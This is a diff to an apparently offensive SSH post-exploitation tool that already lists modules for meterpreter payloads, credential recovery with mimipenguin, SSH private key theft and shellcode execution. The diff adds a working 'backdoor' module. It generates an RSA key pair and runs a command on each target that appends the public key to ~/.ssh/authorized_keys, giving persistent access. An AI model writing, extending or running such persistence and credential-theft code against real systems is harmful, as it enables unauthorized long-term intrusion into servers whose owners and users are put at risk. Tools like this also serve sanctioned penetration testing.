@@ -12,6 +12,7 @@ import argparse
 import threading
 import SocketServer
 import SimpleHTTPServer
+from Crypto.PublicKey import RSA
 from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
 CRED = '\033[91m'
 CEND = '\033[0m'
@@ -288,6 +289,24 @@ def web_delivery(lhost, lport, targets, port, username, password, identity_file,
     print CGREEN + "[!] Executing payload on the targets..." + CEND
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 10])
 
+def add_key_backdoor(targets, port, username, password, identity_file):
+    name = randomword(10)
+    print CGREEN + "[!] Generating RSA key pair..." + CEND
+    key = RSA.generate(2048)
+    with open("payloads/"+ name + "_private.key", 'w') as content_file:
+        os.chmod("payloads/"+ name + "_private.key", 0600)
+        print CYELLOW + "[*] " + name + "payloads/_private.key created" + CEND
+        content_file.write(key.exportKey('PEM'))
+        print CYELLOW + "[*] " + name + "payloads/_private.key created" + CEND
+    pubkey = key.publickey()
+    with open("payloads/"+ name + "_public.key", 'w') as content_file:
+        content_file.write(pubkey.exportKey('OpenSSH'))
+    key = pubkey.exportKey('OpenSSH')
+    command = "echo \"" + key + "\" >> ~/.ssh/authorized_keys"
+    print CGREEN + "[!] Adding SSH public key to Authorized key file... " + CEND
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 10])
+
+
 
 def parse_targets(target):
     #Stolen from CrackMapExec
@@ -416,22 +435,23 @@ def print_modules():
     print ""
     print CRED + "Available Modules:" + CEND
     print CYELLOW + "[*] meterpreter" + CEND + "               Use this to execute a meterpreter agent on the target(s)."
-    print    "                              REQURED ARGUMENTS: LHOST , LPORT"
-    print "                              OPTIONAL ARGUMENTS: TYPE {python, php, 32, 64, osx}"
+    print    "                                  REQURED ARGUMENTS: LHOST , LPORT"
+    print "                                 OPTIONAL ARGUMENTS: TYPE {python, php, 32, 64, osx}"
     print CYELLOW + "[*] mimipenguin" + CEND + "               Use this to execute a mimipenguin on the target(s) to recover credentials.  (Requires root)"
-    print "                              OPTIONAL ARGUMENTS: LHOST, LPORT"
+    print "                                 OPTIONAL ARGUMENTS: LHOST, LPORT"
     print CYELLOW + "[*] keys" + CEND + "                      Use this to collect SSH private keys from the target(s)."
     print CYELLOW + "[*] history" + CEND + "                   Use this to collect shell history files from the target(s)."
     print CYELLOW +  "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
-    print CYELLOW + "[*] web_delivery" + CEND + "               Use this to execute a python script on the target(s)."
-    print    "                              REQURED ARGUMENTS: PATH"
-    print "                              OPTIONAL ARGUMENTS: LISTEN"
-    print CYELLOW + "[*] custom_bin" + CEND + "               Use this to execute a custom binary on the target(s)."
-    print    "                              REQURED ARGUMENTS: PATH"
-    print CYELLOW + "[*] sudo_exec" + CEND + "               Use this to execute a custom binary (with sudo) on the target(s)."
-    print    "                              REQURED ARGUMENTS: PATH"
-    print CYELLOW + "[*] shellcode" + CEND + "               Use this to execute custom shellcode on the target(s)."
-    print    "                              REQURED ARGUMENTS: PATH"
+    print CYELLOW +  "[*] backdoor" + CEND + "                  Creates an RSA key pair and adds public key to authorized_keys file on targets(s)."
+    print CYELLOW + "[*] web_delivery" + CEND + "              Use this to execute a python script on the target(s)."
+    print    "                                  REQURED ARGUMENTS: PATH"
+    print "                                 OPTIONAL ARGUMENTS: LISTEN"
+    print CYELLOW + "[*] custom_bin" + CEND + "                Use this to execute a custom binary on the target(s)."
+    print    "                                  REQURED ARGUMENTS: PATH"
+    print CYELLOW + "[*] sudo_exec" + CEND + "                 Use this to execute a custom binary (with sudo) on the target(s)."
+    print    "                                  REQURED ARGUMENTS: PATH"
+    print CYELLOW + "[*] shellcode" + CEND + "                 Use this to execute custom shellcode on the target(s)."
+    print    "                                  REQURED ARGUMENTS: PATH"
 
 
 def banner():
@@ -528,6 +548,9 @@ def main():
     if args.module == "keys":
         print CGREEN + "[!] Searching system for private keys..." + CEND
         start_thread(targets, "steal", [22, args.username, args.password, args.identity_file, "keys", 100])
+
+    if args.module == "backdoor":
+        add_key_backdoor(targets, 22, args.username, args.password, args.identity_file)
 
     if args.module == "history":
         print CGREEN + "[!] Searching system for command history..." + CEND
